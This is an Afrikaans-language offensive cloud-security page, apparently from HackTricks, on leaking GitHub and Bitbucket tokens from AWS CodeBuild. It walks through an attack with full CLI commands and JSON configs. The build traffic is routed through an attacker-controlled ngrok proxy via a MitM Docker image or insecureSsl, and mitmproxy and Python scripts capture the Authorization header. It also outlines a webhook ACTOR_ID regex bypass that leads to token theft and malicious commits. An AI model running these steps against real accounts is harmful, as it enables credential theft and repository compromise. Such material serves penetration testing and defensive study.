# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Herstel Github/Bitbucket Gekonfigureerde Tokens

Eerstens, kyk of daar enige source credentials gekonfigureer is wat jy kan leak:
```bash
aws codebuild list-source-credentials
```
### Deur Docker Image

Indien jy vind dat authentication na byvoorbeeld Github in die rekening ingestel is, kan jy **exfiltrate** daardie **access** (**GH token or OAuth token**) deur Codebuild te laat **use an specific docker image** om die build van die projek te run.

Vir hierdie doel kan jy **create a new Codebuild project** of die **environment** van 'n bestaande een verander om die **Docker image** te stel.

Die Docker image wat jy kan gebruik is [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Dit is 'n baie basiese Docker image wat die **env variables `https_proxy`**, **`http_proxy`** en **`SSL_CERT_FILE`** sal stel. Dit sal jou toelaat om meeste van die verkeer van die host aangedui in **`https_proxy`** en **`http_proxy`** te onderskep en die SSL CERT aangedui in **`SSL_CERT_FILE`** te vertrou.

1. **Create & Upload your own Docker MitM image**
- Volg die instruksies van die repo om jou proxy IP-adres en SSL cert te stel en **build the docker image**.
- **DO NOT SET `http_proxy`** om nie versoeke na die metadata endpoint te onderskep nie.
- Jy kan **`ngrok`** soos `ngrok tcp 4444` gebruik om die proxy na jou host te stel
- Sodra jy die Docker image gebou het, **upload dit na 'n publieke repo** (Dockerhub, ECR...)
2. **Set the environment**
- Create a **new Codebuild project** of **modify** die environment van 'n bestaande een.
- Stel die project om die **previously generated Docker image** te gebruik

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- Soos aangedui in die **Github repo** kan jy iets soos gebruik:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> Die **mitmproxy-weergawe wat gebruik is, was 9.0.1**, daar is gerapporteer dat dit met weergawe 10 dalk nie sal werk nie.

4. **Voer die build uit & capture die credentials**

- Jy kan die token in die **Authorization** header sien:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Dit kan ook vanaf die aws cli gedoen word met iets soos
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Deur insecureSSL

**Codebuild** projekte het 'n instelling genaamd **`insecureSsl`** wat in die web versteek is — jy kan dit slegs via die API.\
Deur dit te aktiveer, kan Codebuild met die repository verbind **sonder om die sertifikaat te kontroleer** wat deur die platform aangebied word.

- Eerstens moet jy die huidige konfigurasie opspoor met iets soos:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Dan, met die versamelde inligting kan jy die projekinstelling **`insecureSsl`** na **`True`** bywerk. Die volgende is 'n voorbeeld van hoe ek 'n projek bywerk; let op die **`insecureSsl=True`** aan die einde (dit is die enigste ding wat jy van die versamelde konfigurasie hoef te verander).
- Verder, voeg ook die omgewingsvariabeles **http_proxy** en **https_proxy** by en stel dit in om na jou tcp ngrok te wys, soos:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Voer dan die basiese voorbeeld vanaf [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) uit op die poort waarna die proxy-variabels (http_proxy en https_proxy) wys.
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Uiteindelik, klik op **Build the project**, die **credentials** sal in **duidelike teks** (base64) na die mitm port gestuur word:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Deur die HTTP-protokol~~

> [!TIP] > **Hierdie kwesbaarheid is deur AWS op 'n tydstip in die week van die 20ste Feb 2023 reggestel (ek dink Vrydag). Dus kan 'n aanvaller dit nie meer misbruik nie :)**

'n Aanvaller met **opgehewe permissies in 'n CodeBuild could leak the Github/Bitbucket token** wat gekonfigureer is, of as permissies via OAuth gekonfigureer is, die **tydelike OAuth token wat gebruik word om toegang tot die kode te verkry**.

- 'n Aanvaller kon die omgewingsveranderlikes **http_proxy** en **https_proxy** by die CodeBuild-projek voeg wat na sy masjien wys (byvoorbeeld `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Verander dan die URL van die github repo om HTTP in plaas van HTTPS te gebruik, byvoorbeeld: `http://github.com/carlospolop-forks/TestActions`
- Dan voer jy die basiese voorbeeld van [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) uit op die poort waarna die proxy-veranderlikes (http_proxy en https_proxy) wys
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Klik dan op **Bou die projek** of begin die bou vanaf die opdraglyn:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Laastens sal die **inlogbesonderhede** in **platte teks** (base64) na die mitm-poort gestuur word:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Nou kan ’n aanvaller die token vanaf sy masjien gebruik, al die bevoegdhede wat dit het lys en dit makliker misbruik as om die CodeBuild-diens direk te gebruik.

## Webhook-filter ACTOR_ID regex allowlist-omseiling (PR-geaktiveerde bevoorregte builds)

Misgekonfigureerde CodeBuild GitHub webhooks wat ongeankerde `ACTOR_ID` regexes gebruik laat *onbetroubare* PRs toe om bevoorregte builds te begin. As die allowlist soos `123456|7890123` is sonder `^`/`$`, stem enige ID wat een van daardie substringe bevat ooreen. Aangesien GitHub-gebruikers-ID's sekwensieel is, kan ’n aanvaller ’n wedloop aangaan om ’n “eclipsing” ID te registreer (’n superstring van ’n vertroude ID) en die build te aktiveer.

**Eksploitpad**

1. Vind openbare CodeBuild-projekte wat webhook-filters openbaar en haal ’n ongeankerde `ACTOR_ID` allowlist uit.
2. Verkry ’n eclipsing GitHub ID:
- Neem monsters van die globale ID-teller deur GitHub orgs te skep/verwyder (org IDs deel dieselfde poel).
- Stel vooraf baie GitHub App manifest-skeppings op en aktiveer die bevestigings-URLs wanneer die teller binne ~100 ID's van die teiken is om ’n groep registrasies te doen en ’n bot-ID te burst-register wat die vertroude substring bevat.
3. Maak ’n PR oop vanaf die eclipsing-rekening; die regex pas by die substring en die bevoorregte build word uitgevoer.
4. Gebruik build RCE (bv. dependency install hooks) om prosesgeheue wat die GitHub-inlogbesonderhede hanteer uit te leeg en die PAT/OAuth token te herstel.
5. Met die token se `repo`-scope, nooi jou rekening as collaborator/admin uit en push/goedgekeur kwaadwillige commits of eksfiltreer geheime.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
